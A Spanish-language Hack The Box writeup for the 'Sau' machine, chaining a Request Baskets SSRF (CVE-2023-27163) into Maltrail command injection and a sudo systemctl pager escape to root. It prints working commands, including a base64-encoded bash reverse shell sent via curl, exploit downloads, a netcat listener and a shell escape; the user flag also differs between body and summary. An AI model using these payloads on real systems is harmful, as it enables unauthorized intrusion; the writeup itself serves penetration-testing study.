---
tags:
  - type/writeup
  - env/linux
  - estado/completo
  - cert/oscp
plataforma: "[[Hack The Box]]"
web: https://app.hackthebox.com/machines/551
dificultad: Fácil
ip: 10.10.11.224
os: Linux
relacionados:
  - "[[Server-Side Request Forgery (SSRF)]]"
  - "[[CVE-2023-27163]]"
  - "[[Remote Code Execution|RCE]]"
  - "[[Sudo abuse]]"
---
# HackTheBox - Sau

## Enumeración

### Escaneo de Puertos

El escaneo inicial se realiza con `nmap` para identificar los puertos abiertos.

```bash
kali@kali:~$ nmap 10.10.11.224
```

**Resultado:**
```
Starting Nmap 7.94SVN ( [https://nmap.org](https://nmap.org) ) at 2023-12-27 18:36 EST
Nmap scan report for 10.10.11.224
Host is up (0.032s latency).
Not shown: 997 closed tcp ports (conn-refused)
PORT      STATE    SERVICE
22/tcp    open     ssh
80/tcp    filtered http
55555/tcp open     unknown

Nmap done: 1 IP address (1 host up) scanned in 1.61 seconds
```

> [!info] Puertos Encontrados
> - **Puerto 22/tcp (SSH):** Abierto.
> - **Puerto 80/tcp (HTTP):** Filtrado, no se puede acceder directamente.
> - **Puerto 55555/tcp:** Abierto, con un servicio desconocido.

Un escaneo más profundo con `nmap -sV -A` revela que el puerto `55555` aloja un servidor web. La respuesta a una petición `GET` redirige a `/web`.

```bash
55555/tcp open     unknown
| fingerprint-strings: 
|   GetRequest: 
|     HTTP/1.0 302 Found
|     Content-Type: text/html; charset=utf-8
|     Location: /web
|     Date: Wed, 27 Dec 2023 23:36:50 GMT
|     Content-Length: 27
|     href="/web">Found.
```

### Enumeración Web 

Al visitar `http://10.10.11.224:55555` en un navegador, se nos redirige a `http://10.10.11.224:55555/web`, que muestra la aplicación **Request Baskets v1.2.1**.

Un escaneo con `gobuster` confirma la existencia del directorio `/web`.

```bash
kali@kali:~$ gobuster dir -u [http://10.10.11.224:55555](http://10.10.11.224:55555) -w /usr/share/wordlists/dirb/common.txt
```

**Resultado:**
```
...
/web                  (Status: 200) [Size: 8700]
...
```


---

## Explotación de Vulnerabilidades

### Explotación de SSRF 

> [!ATTENTION] Vulnerabilidad Identificada
> **Aplicación:** Request Baskets v1.2.1
> **Vulnerabilidad:** Server-Side Request Forgery (SSRF) - **CVE-2023-27163**
> **Impacto:** Permite que el servidor realice peticiones a recursos internos, como el puerto 80 que se encontraba filtrado.

#### Opción 1) Explotación mediante script 

1. **Descargar el script de explotación:**
   ```bash
   wget https://raw.githubusercontent.com/entr0pie/CVE-2023-27163/main/CVE-2023-27163.sh
   chmod +x CVE-2023-27163.sh
   ```

2. **Ejecutar el script para crear un proxy hacia el puerto 80 local:**
   ```bash
   ./CVE-2023-27163.sh [http://10.10.11.224:55555/](http://10.10.11.224:55555/) [http://127.0.0.1:80/](http://127.0.0.1:80/)
   ```

   **Salida:**
   ```
   > Creating the "gpgdps" proxy basket...
   > Basket created!
   > Accessing [http://10.10.11.224:55555/gpgdps](http://10.10.11.224:55555/gpgdps) now makes the server request to [http://127.0.0.1:80/](http://127.0.0.1:80/).
   > Authorization: p07WiXMzYK1xulbH8LTDd9R7q2KwSSsksCf-IqNpKy1-
   ```
   Ahora, al acceder a `http://10.10.11.224:55555/gpgdps`, el servidor redirigirá internamente nuestra petición a `http://127.0.0.1:80`. Al hacer esto, descubrimos la aplicación **Maltrail v0.53**.

#### Opción 2) Explotación manual

1. Creo un `Basquet`, pongo para que haga un reenvió al servidor local `http://127.0.0.1:80`.
2. Habilito el proxy pare recibir respuestas de las solicitudes. 
3. Entro a la URL donde `Request Basquet` recibe mis peticiones: `http://10.10.11.224:55555/gpgdps`.

Al igual que el caso anterior, ahora al acceder a `http://10.10.11.224:55555/gpgdps`, el servidor responde y me redirige internamente a la petición `http://127.0.0.1:80`. Dentro se descubre la aplicación **Mailtrail v0.53**.

### RCE en Maltrail (v0.53)

> [!ATTENTION] Vulnerabilidad Identificada
> **Aplicación:** Maltrail v0.53
> **Vulnerabilidad:** RCE no autenticada.
> **Impacto:** Permite ejecutar comandos en el sistema operativo subyacente.

https://github.com/spookier/Maltrail-v0.53-Exploit

#### Opción 1) Explotación mediante script 

1. **Modificar el exploit:**
   El script de explotación debe ser modificado para apuntar a la URL del proxy que creamos con el SSRF.
   ```python
   # Línea a modificar en el script exploit.py
   target_URL = sys.argv[3] + "/gpgdps/login"
   ```

2. **Iniciar un listener en nuestra máquina:**
   ```bash
   nc -lnvp 443
   ```

3. **Ejecutar el exploit:**
   Reemplaza `10.10.14.3` con tu IP de atacante.
   ```bash
   python3 exploit.py 10.10.14.3 1337 10.10.11.224:55555
   ```

4. **Recibir la reverse shell:**
   El listener de Netcat recibirá la conexión.
   ```bash
  nc -lnvp 443
   listening on [any] 1337 ...
   connect to [10.10.14.3] from (UNKNOWN) [10.10.11.224] 52288
   $
   ```

#### Opción 2) Explotación manual

1. Parece que la explotación se da en el directorio de login: `http://127.0.0.1:80/login`, así que agrego el `/login` en la parte de la redirección del `request basket`.
2. La vulnerabilidad surge al agregar este campo: 
```bash
'username=;`'
```
3. Ejecuto la vulnerabilidad y le pido una reverse shell (en base 64):
```bash
curl http://10.10.11.224:55555/ga2uq3o -d 'username=;`echo YmFzaCAtYyAiYmFzaCAtaSAgPiYgIC9kZXYvdGNwLzEwLjEwLjE0LjQvNDQzICAwPiYxIg== | base64 -d | bash`'
```
4. Obtengo acceso a la maquina.

> [!SUCCESS] User Flag Obtenida
> Una vez dentro, podemos leer la bandera del usuario.
> ```bash
> $ cd /home/puma
> $ cat user.txt
> 81f58b68de8597a42addecfa4182eefd
> ```


---

## Escalada de Privilegios

### Enumeración Local con LinPEAS

Para buscar vectores de escalada, transferimos y ejecutamos `linpeas.sh` en la máquina víctima.

1.  **En la máquina atacante, servir el archivo:**
    ```bash
    wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh
    python3 -m http.server 9000
    ```

2.  **En la máquina víctima, descargar y ejecutar el script:**
    ```bash
    $ wget [http://10.10.14.3:9000/linpeas.sh](http://10.10.14.3:9000/linpeas.sh)
    $ chmod +x linpeas.sh
    $ ./linpeas.sh
    ```

### Abuso de `sudo systemctl`

LinPEAS resalta un permiso de `sudo` interesante para el usuario `puma`.

> [!ATTENTION] Vector de Escalada de Privilegios
> El usuario `puma` puede ejecutar el siguiente comando como `root` sin contraseña:
> ```
> User puma may run the following commands on sau:
>     (ALL : ALL) NOPASSWD: /usr/bin/systemctl status trail.service
> ```
> El comando `systemctl status` abre la salida en un paginador (como `less`). Es posible escapar de este paginador para ejecutar comandos del sistema.

1. **Ejecutar el comando `sudo` permitido:**
   ```bash
   $ sudo /usr/bin/systemctl status trail.service
   ```

2. **Escapar del paginador:**
   Una vez que se muestre la salida del servicio, el programa esperará una entrada. Simplemente escribe `!/bin/sh` y presiona `Enter`. Esto ejecutará un shell a través del paginador.
   ```
   ... (salida de systemctl) ...
   lines 1-23
   !/bin/sh
   ```

3. **Verificar el acceso:**
   Ahora tendrás un shell como `root`.
   ```bash
   # whoami
   root
   ```

> [!SUCCESS] Root Flag Obtenida
> Con privilegios de `root`, podemos leer la bandera final.
> ```bash
> # cat /root/root.txt
> e1e56f3d29f3d135294dbb79a299e1ef
> ```


___

## Bandera(s)

> [!flag] `flag{user}`
> 75006c72f8993fdc8d15526ed5ce45f4
^bandera-user

> [!flag] `flag{root}`
> e1e56f3d29f3d135294dbb79a299e1ef
^bandera-root
